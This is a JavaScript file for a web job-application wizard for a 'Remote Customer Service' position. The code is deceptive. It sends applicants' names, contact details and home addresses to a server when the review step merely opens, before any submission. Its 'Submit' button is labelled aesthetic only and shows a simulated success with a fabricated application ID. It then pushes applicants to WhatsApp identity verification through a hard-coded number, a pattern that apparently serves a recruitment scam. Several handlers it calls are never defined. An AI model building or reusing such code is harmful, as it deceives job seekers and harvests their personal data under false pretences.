class ApplicationWizard {
    constructor() {
        this.currentStep = 1;
        this.data = JSON.parse(localStorage.getItem('wizardData') || '{}');
        this.mediaRecorder = null;
        this.recordedBlob = null;
        console.log('Wizard initialized');
        this.init();
    }

    init() {
        this.bindEvents();
        this.loadData();
        this.updateProgress();
        console.log('Wizard ready, current step:', this.currentStep);
    }

    bindEvents() {
        console.log('Binding events...');
        
        // Direct button event binding
        const nextBtns = document.querySelectorAll('.btn-next');
        const prevBtns = document.querySelectorAll('.btn-prev');
        const submitBtn = document.querySelector('.btn-submit');
        
        nextBtns.forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.preventDefault();
                console.log('Next button clicked');
                this.nextStep();
            });
        });
        
        prevBtns.forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.preventDefault();
                console.log('Previous button clicked');
                this.prevStep();
            });
        });
        
        if (submitBtn) {
            submitBtn.addEventListener('click', (e) => {
                e.preventDefault();
                console.log('Submit button clicked');
                this.submitForm();
            });
        }

        // Video recording buttons
        const startCameraBtn = document.getElementById('startCamera');
        const recordBtn = document.getElementById('recordBtn');
        const stopBtn = document.getElementById('stopBtn');
        const retakeBtn = document.getElementById('retakeBtn');
        
        if (startCameraBtn) {
            startCameraBtn.addEventListener('click', (e) => {
                e.preventDefault();
                this.startCamera();
            });
        }
        
        if (recordBtn) {
            recordBtn.addEventListener('click', (e) => {
                e.preventDefault();
                this.startRecording();
            });
        }
        
        if (stopBtn) {
            stopBtn.addEventListener('click', (e) => {
                e.preventDefault();
                this.stopRecording();
            });
        }
        
        if (retakeBtn) {
            retakeBtn.addEventListener('click', (e) => {
                e.preventDefault();
                this.retakeVideo();
            });
        }
        
        // File upload preview
        document.addEventListener('change', (e) => {
            if (e.target.type === 'file') {
                this.handleFileUpload(e.target);
            }
        });

        // Form submission
        const form = document.getElementById('wizardForm');
        if (form) {
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                this.submitForm();
            });
        }

        // Auto-save on input
        document.addEventListener('input', (e) => {
            if (e.target.closest('#wizardForm')) {
                this.saveData();
            }
        });
        
        console.log('Events bound successfully');
    }

    nextStep() {
        console.log('NextStep called, current step:', this.currentStep);
        if (this.validateStep()) {
            this.saveData();
            this.currentStep++;
            this.showStep(true); // true = scroll to top
            this.updateProgress();
            console.log('Moved to step:', this.currentStep);
        }
    }

    prevStep() {
        this.currentStep--;
        this.showStep(true); // true = scroll to top
        this.updateProgress();
    }

    showStep(shouldScroll = false) {
        document.querySelectorAll('.wizard-step').forEach(step => {
            step.classList.toggle('active', step.dataset.step == this.currentStep);
        });
        
        // Only scroll if explicitly requested (when user navigates)
        if (shouldScroll) {
            setTimeout(() => {
                const wizardContainer = document.querySelector('.wizard-container');
                if (wizardContainer) {
                    wizardContainer.scrollIntoView({ 
                        behavior: 'smooth', 
                        block: 'start',
                        inline: 'nearest'
                    });
                }
            }, 100);
        }
        
        // Handle step-specific logic
        if (this.currentStep === 2) {
            this.personalizeStep2();
        }
        if (this.currentStep === 3) {
            this.populateReviewData();
            this.saveToGoogleSheets();
            
            // Track Facebook Pixel lead event when entering step 3
            if (typeof fbq !== 'undefined') {
                fbq('track', 'Lead', {
                    content_name: 'customer-service-application',
                    content_category: 'job-application',
                    value: 50.00,
                    currency: 'USD'
                });
            }
        }
    }
    
    personalizeStep2() {
        const experience = this.data.experience;
        
        // Personalize pay based on experience
        const payElement = document.getElementById('personalizedPay');
        if (payElement) {
            let payRange = '$16-18/hour';
            if (experience === 'expert') payRange = '$18-20/hour';
            if (experience === 'none') payRange = '$15-17/hour';
            payElement.textContent = payRange;
        }
    }
    
    populateReviewData() {
        // Populate personal information
        const reviewName = document.getElementById('reviewName');
        const reviewEmail = document.getElementById('reviewEmail');
        const reviewPhone = document.getElementById('reviewPhone');
        const reviewWhatsapp = document.getElementById('reviewWhatsapp');
        const reviewAddress = document.getElementById('reviewAddress');
        const reviewExperience = document.getElementById('reviewExperience');
        const reviewSchedule = document.getElementById('reviewSchedule');
        
        if (reviewName) {
            const firstName = document.getElementById('firstName')?.value || '';
            const lastName = document.getElementById('lastName')?.value || '';
            reviewName.textContent = `${firstName} ${lastName}`.trim() || '-';
        }
        
        if (reviewEmail) {
            reviewEmail.textContent = document.getElementById('email')?.value || '-';
        }
        
        if (reviewPhone) {
            reviewPhone.textContent = document.getElementById('phone')?.value || '-';
        }
        
        if (reviewWhatsapp) {
            reviewWhatsapp.textContent = document.getElementById('whatsapp')?.value || '-';
        }
        
        if (reviewAddress) {
            const street = document.getElementById('street')?.value || '';
            const city = document.getElementById('city')?.value || '';
            const state = document.getElementById('state')?.value || '';
            const zipCode = document.getElementById('zipCode')?.value || '';
            const country = document.getElementById('country')?.value || '';
            
            if (street && city && state && zipCode) {
                reviewAddress.textContent = `${street}, ${city}, ${state} ${zipCode}, ${country}`;
            } else {
                reviewAddress.textContent = '-';
            }
        }
        
        if (reviewExperience) {
            const experienceSelect = document.getElementById('experience');
            const selectedOption = experienceSelect?.options[experienceSelect.selectedIndex];
            reviewExperience.textContent = selectedOption?.text || '-';
        }
        
        if (reviewSchedule) {
            const scheduleSelect = document.getElementById('schedule');
            const selectedOption = scheduleSelect?.options[scheduleSelect.selectedIndex];
            reviewSchedule.textContent = selectedOption?.text || '-';
        }

        // Wait a moment for DOM to be fully ready, then initialize WhatsApp
        setTimeout(() => {
            this.initializeWhatsAppContact();
        }, 100);
    }

    initializeWhatsAppContact() {
        const whatsappBtn = document.getElementById('whatsappDirectContact');
        if (whatsappBtn) {
            const recruiterNumber = '+306946023086';
            const firstName = document.getElementById('firstName')?.value || this.data.firstName || '';
            const lastName = document.getElementById('lastName')?.value || this.data.lastName || '';
            const applicantName = `${firstName} ${lastName}`.trim();
            
            const experienceSelect = document.getElementById('experience');
            const scheduleSelect = document.getElementById('schedule');
            const experience = experienceSelect?.options[experienceSelect.selectedIndex]?.text || 'some experience';
            const schedule = scheduleSelect?.options[scheduleSelect.selectedIndex]?.text || 'flexible schedule';
            
            const message = `Hi! I'm ${applicantName} and I just submitted an application for the Remote Customer Service position. I have ${experience.toLowerCase()} and am looking for ${schedule.toLowerCase()} work. I'd love to discuss how I can contribute to your team and would appreciate priority processing of my application. Thank you!`;
            
            const whatsappUrl = `https://wa.me/${recruiterNumber.replace('+', '')}?text=${encodeURIComponent(message)}`;
            
            // Set href attribute
            whatsappBtn.href = whatsappUrl;
            whatsappBtn.target = '_blank';
            
            // Remove any existing click handlers
            whatsappBtn.onclick = null;
            
            // Add click event handler
            whatsappBtn.addEventListener('click', function(e) {
                e.preventDefault();
                console.log('WhatsApp button clicked, opening:', whatsappUrl);
                window.open(whatsappUrl, '_blank');
            });
            
            console.log('WhatsApp button initialized:', whatsappUrl);
            console.log('Button element:', whatsappBtn);
        } else {
            console.warn('WhatsApp button not found');
        }
    }

    async saveToGoogleSheets() {
        try {
            this.saveData();
            const firstName = document.getElementById('firstName')?.value || this.data.firstName || '';
            const lastName = document.getElementById('lastName')?.value || this.data.lastName || '';
            const email = document.getElementById('email')?.value || this.data.email || '';
            const phone = document.getElementById('phone')?.value || this.data.phone || '';
            const whatsapp = document.getElementById('whatsapp')?.value || this.data.whatsapp || '';
            const street = document.getElementById('street')?.value || this.data.street || '';
            const city = document.getElementById('city')?.value || this.data.city || '';
            const state = document.getElementById('state')?.value || this.data.state || '';
            const zipCode = document.getElementById('zipCode')?.value || this.data.zipCode || '';
            const country = document.getElementById('country')?.value || this.data.country || '';
            const experience = document.getElementById('experience')?.value || this.data.experience || '';
            const schedule = document.getElementById('schedule')?.value || this.data.schedule || '';
            
            const formData = new FormData();
            formData.append('firstName', firstName);
            formData.append('lastName', lastName);
            formData.append('email', email);
            formData.append('phone', phone);
            formData.append('whatsapp', whatsapp);
            formData.append('street', street);
            formData.append('city', city);
            formData.append('state', state);
            formData.append('zipCode', zipCode);
            formData.append('country', country);
            formData.append('experience', experience);
            formData.append('schedule', schedule);
            
            console.log('Saving to Google Sheets for:', `${firstName} ${lastName}`);
            
            const response = await fetch('/api/submit-application', {
                method: 'POST',
                body: formData
            });

            const result = await response.json();
            console.log('Google Sheets save result:', result);
            
            if (result.success) {
                console.log('✅ Lead saved to Google Sheets successfully:', result.applicationId);
            }
        } catch (error) {
            console.warn('⚠️ Google Sheets save failed (non-critical):', error);
        }
    }

    updateProgress() {
        const progress = (this.currentStep / 3) * 100;
        document.querySelector('.progress-fill').style.width = progress + '%';
        
        document.querySelectorAll('.step').forEach((step, i) => {
            step.classList.toggle('active', i + 1 === this.currentStep);
            step.classList.toggle('completed', i + 1 < this.currentStep);
        });
    }

    validateStep(stepNumber = this.currentStep) {
        const step = document.querySelector(`[data-step="${stepNumber}"]`);
        console.log('Validating step:', stepNumber, 'found element:', !!step);
        
        if (!step) return false;
        
        // Special validation for Step 3 (review and submit)
        if (stepNumber === 3) {
            // All validation is done in previous steps, just populate review
            this.populateReviewData();
            return true;
        }
        

        
        const inputs = step.querySelectorAll('input[required], select[required]');
        console.log('Found required inputs:', inputs.length);
        
        let isValid = true;
        const errors = [];
        
        inputs.forEach(input => {
            this.clearFieldError(input);
            input.style.borderColor = '#e2e8f0';
            
            // Check if field is empty
            if (!this.hasValue(input)) {
                isValid = false;
                input.style.borderColor = '#ef4444';
                this.showFieldError(input, this.getRequiredFieldMessage(input));
                errors.push(this.getRequiredFieldMessage(input));
                return;
            }
            
            // Validate field format
            const validationResult = this.validateFieldFormat(input);
            if (!validationResult.isValid) {
                isValid = false;
                input.style.borderColor = '#ef4444';
                this.showFieldError(input, validationResult.message);
                errors.push(validationResult.message);
            }
        });
        
        if (!isValid && stepNumber === this.currentStep) {
            this.showValidationMessage('Please fix the errors above to continue.');
        }
        
        console.log('Step validation result:', isValid);
        return isValid;
    }

    hasValue(input) {
        if (input.type === 'checkbox') {
            return input.checked;
        } else if (input.type === 'file') {
            return input.files && input.files.length > 0;
        } else {
            return input.value.trim() !== '';
        }
    }

    validateFieldFormat(input) {
        const value = input.value.trim();
        
        switch (input.type) {
            case 'email':
                return this.validateEmail(value);
            case 'tel':
                return this.validatePhone(value);
            default:
                switch (input.name) {
                    case 'firstName':
                    case 'lastName':
                        return this.validateName(value);
                    case 'whatsapp':
                        return this.validatePhone(value);
                    case 'street':
                    case 'city':
                    case 'state':
                    case 'country':
                    case 'zipCode':
                        return { isValid: true };
                    default:
                        return { isValid: true };
                }
        }
    }

    validateEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
            return { isValid: false, message: 'Please enter a valid email (e.g., john@example.com)' };
        }
        return { isValid: true };
    }

    validatePhone(phone) {
        const digitsOnly = phone.replace(/\D/g, '');
        
        if (digitsOnly.length < 10) {
            return { isValid: false, message: 'Phone number must be at least 10 digits' };
        }
        
        if (digitsOnly.length > 11) {
            return { isValid: false, message: 'Phone number is too long (max 11 digits)' };
        }
        
        if (digitsOnly.length === 11 && !digitsOnly.startsWith('1')) {
            return { isValid: false, message: 'For 11-digit numbers, start with 1' };
        }
        
        return { isValid: true };
    }

    validateName(name) {
        if (name.length < 2) {
            return { isValid: false, message: 'Name must be at least 2 characters' };
        }
        
        if (name.length > 50) {
            return { isValid: false, message: 'Name is too long (max 50 characters)' };
        }
        
        if (!/^[a-zA-Z\s'-]+$/.test(name)) {
            return { isValid: false, message: 'Name can only contain letters, spaces, hyphens, and apostrophes' };
        }
        
        return { isValid: true };
    }

    validateLocation(location) {
        return { isValid: true };
    }
    

    




    getRequiredFieldMessage(input) {
        const messages = {
            email: 'Email address is required',
            firstName: 'First name is required',
            lastName: 'Last name is required',
            phone: 'Phone number is required',
            whatsapp: 'WhatsApp number is required',
            street: 'Street address is required',
            city: 'City is required',
            state: 'State is required',
            zipCode: 'ZIP code is required',
            country: 'Country is required',
            experience: 'Please select your experience level',
            schedule: 'Please select your preferred schedule'
        };
        
        return messages[input.name] || 'This field is required';
    }

    showValidationMessage(message) {
        // Create or update validation message
        let messageEl = document.getElementById('validation-message');
        if (!messageEl) {
            messageEl = document.createElement('div');
            messageEl.id = 'validation-message';
            messageEl.style.cssText = `
                background: #fee2e2;
                border: 1px solid #fecaca;
                color: #dc2626;
                padding: 12px 16px;
                border-radius: 8px;
                margin: 16px 0;
                font-size: 14px;
                font-weight: 500;
            `;
            
            const currentStep = document.querySelector(`[data-step="${this.currentStep}"]`);
            if (currentStep) {
                currentStep.insertBefore(messageEl, currentStep.firstChild);
            }
        }
        
        messageEl.textContent = message;
        messageEl.style.display = 'block';
        
        // Auto-hide after 5 seconds
        setTimeout(() => {
            if (messageEl) {
                messageEl.style.display = 'none';
            }
        }, 5000);
    }

    showFieldError(field, message) {
        const fieldName = field.name || field.id;
        const errorId = `${fieldName}-error`;
        let errorElement = document.getElementById(errorId);
        
        if (!errorElement) {
            errorElement = document.createElement('div');
            errorElement.id = errorId;
            errorElement.style.color = '#ef4444';
            errorElement.style.fontSize = '14px';
            errorElement.style.marginTop = '5px';
            errorElement.style.fontWeight = '500';
            
            // Insert after the field or its parent label
            const insertAfter = field.parentNode.querySelector('label') ? field.parentNode : field;
            insertAfter.parentNode.insertBefore(errorElement, insertAfter.nextSibling);
        }
        
        errorElement.textContent = message;
        errorElement.style.display = 'block';
    }

    clearFieldError(field) {
        const fieldName = field.name || field.id;
        const errorElement = document.getElementById(`${fieldName}-error`);
        if (errorElement) {
            errorElement.style.display = 'none';
        }
    }

    saveData() {
        const form = document.getElementById('wizardForm');
        if (!form) return;
        
        // Get all form inputs
        const inputs = form.querySelectorAll('input, select, textarea');
        inputs.forEach(input => {
            if (!input.name) return; // Skip inputs without names
            
            if (input.type === 'checkbox') {
                this.data[input.name] = input.checked;
            } else if (input.type === 'file') {
                // Don't save file inputs to localStorage, but track if they have files
                this.data[input.name + '_hasFile'] = input.files && input.files.length > 0;
            } else if (input.value !== undefined) {
                this.data[input.name] = input.value;
            }
        });
        
        console.log('Saved data:', this.data);
        localStorage.setItem('wizardData', JSON.stringify(this.data));
    }

    loadData() {
        Object.keys(this.data).forEach(key => {
            const input = document.querySelector(`[name="${key}"]`);
            if (input && input.type !== 'file') {
                if (input.type === 'checkbox') {
                    input.checked = this.data[key] === 'true' || this.data[key] === true;
                } else {
                    input.value = this.data[key];
                }
            }
        });
    }



    async submitForm() {
        console.log('Final submit clicked (aesthetic only)');
        
        // Validate required fields first
        if (!this.validateStep(3)) {
            console.log('Step 3 validation failed');
            return;
        }
        
        this.saveData();
        
        try {
            // Show loading overlay for aesthetic purposes
            this.showLoadingOverlay();
            
            const submitBtn = document.getElementById('finalSubmit');
            if (submitBtn) {
                submitBtn.disabled = true;
                submitBtn.innerHTML = `
                    <div style="display: flex; align-items: center; justify-content: center; gap: 10px;">
                        <div style="width: 20px; height: 20px; border: 2px solid #ffffff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
                        Submitting Application...
                    </div>
                `;
            }
            
            // Simulate processing time for aesthetic purposes
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            localStorage.removeItem('wizardData');
            this.hideLoadingOverlay();
            
            // Show success message (data already saved to Google Sheets in step 3)
            const firstName = this.data.firstName || '';
            const lastName = this.data.lastName || '';
            const mockResult = {
                success: true,
                message: 'Application submitted successfully! A representative will contact you via WhatsApp within 48-72 hours.',
                applicationId: 'APP-' + Date.now(),
                applicantFolder: `${new Date().toISOString().slice(0, 10)}_${firstName}-${lastName}`.toLowerCase(),
                nextSteps: [
                    'Keep your WhatsApp active and ready to receive messages',
                    'A representative will contact you within 48-72 hours',
                    'Identity verification will be conducted via WhatsApp video call',
                    'Interview will be scheduled after successful verification',
                    'Hiring and onboarding will begin if all goes well'
                ]
            };
            
            this.showSuccessMessage(mockResult);
            
        } catch (err) {
            console.error('Submission error:', err);
            this.hideLoadingOverlay();
            alert(`Submission failed: ${err.message}. Please try again.`);
            
            const submitBtn = document.getElementById('finalSubmit');
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.innerHTML = '🚀 Submit Application';
            }
        }
    }

    showSuccessMessage(result) {
        const successModal = document.getElementById('successModal');
        if (successModal) {
            successModal.innerHTML = `
                <div class="success-content">
                    <div class="success-icon">
                        <span>✓</span>
                    </div>
                    <h2>Application Submitted Successfully!</h2>
                    <p>Your application has been received and is being processed.</p>
                    
                    <div class="application-details">
                        <div class="detail-row">
                            <span class="detail-label">Application ID:</span>
                            <span class="detail-value">${result.applicationId}</span>
                        </div>
                        ${result.applicantFolder ? `
                        <div class="detail-row">
                            <span class="detail-label">Reference:</span>
                            <span class="detail-value">${result.applicantFolder}</span>
                        </div>
                        ` : ''}
                    </div>
                    
                    <div class="next-steps">
                        <h3>📋 What Happens Next:</h3>
                        <ul>
                            ${result.nextSteps ? result.nextSteps.map(step => `
                                <li>
                                    <span class="check-icon">✓</span>
                                    ${step}
                                </li>
                            `).join('') : `
                                <li>
                                    <span class="check-icon">✓</span>
                                    Check your email for confirmation within 15 minutes
                                </li>
                                <li>
                                    <span class="check-icon">✓</span>
                                    Prepare for a brief phone screening call
                                </li>
                                <li>
                                    <span class="check-icon">✓</span>
                                    Background check will begin processing
                                </li>
                                <li>
                                    <span class="check-icon">✓</span>
                                    Interview scheduling confirmation coming soon
                                </li>
                            `}
                        </ul>
                    </div>
                    
                    <div class="follow-up-notice">
                        <p>📱 <strong>A representative will contact you via WhatsApp within 48-72 hours.</strong> Please keep your WhatsApp active and ready to respond!</p>
                    </div>
                    
                    <button onclick="location.reload()" class="submit-another-btn">
                        Submit Another Application
                    </button>
                </div>
            `;
            successModal.style.display = 'flex';
            
            // Add fade-in animation
            if (!document.getElementById('modal-animations')) {
                const style = document.createElement('style');
                style.id = 'modal-animations';
                style.textContent = `
                    @keyframes fadeIn {
                        from { opacity: 0; transform: scale(0.9); }
                        to { opacity: 1; transform: scale(1); }
                    }
                `;
                document.head.appendChild(style);
            }
        }
    }

    showLoadingOverlay() {
        // Remove existing overlay if any
        this.hideLoadingOverlay();
        
        const overlay = document.createElement('div');
        overlay.id = 'loadingOverlay';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 99999;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        `;
        
        overlay.innerHTML = `
            <div style="background: white; padding: 40px; border-radius: 16px; text-align: center; max-width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.2);">
                <div style="width: 50px; height: 50px; border: 4px solid #e5e7eb; border-top: 4px solid #3b82f6; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
                <h3 style="color: #1f2937; margin-bottom: 15px; font-size: 18px;">Submitting Your Application</h3>
                <p style="color: #6b7280; margin: 0; font-size: 14px;">Please don't close this window or navigate away.<br>This will only take a moment...</p>
            </div>
        `;
        
        // Add spinner animation
        if (!document.getElementById('spinner-styles')) {
            const style = document.createElement('style');
            style.id = 'spinner-styles';
            style.textContent = `
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            `;
            document.head.appendChild(style);
        }
        
        document.body.appendChild(overlay);
        
        // Prevent page navigation during submission
        this.beforeUnloadHandler = (e) => {
            e.preventDefault();
            e.returnValue = 'Your application is being submitted. Are you sure you want to leave?';
            return 'Your application is being submitted. Are you sure you want to leave?';
        };
        window.addEventListener('beforeunload', this.beforeUnloadHandler);
    }

    hideLoadingOverlay() {
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.remove();
        }
        
        // Remove beforeunload handler
        if (this.beforeUnloadHandler) {
            window.removeEventListener('beforeunload', this.beforeUnloadHandler);
            this.beforeUnloadHandler = null;
        }
    }


}

// Initialize wizard when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    console.log('DOM Content Loaded, checking for wizard form...');
    
    // Function to check and initialize wizard
    const checkAndInitWizard = () => {
        const wizardForm = document.getElementById('wizardForm');
        if (wizardForm) {
            console.log('Wizard form found, initializing...');
            window.applicationWizard = new ApplicationWizard();
            return true;
        }
        return false;
    };
    
    // Try immediately
    if (!checkAndInitWizard()) {
        // If not found, wait and try again
        setTimeout(() => {
            if (!checkAndInitWizard()) {
                console.log('Wizard form not found after delay');
            }
        }, 1000);
    }
}); 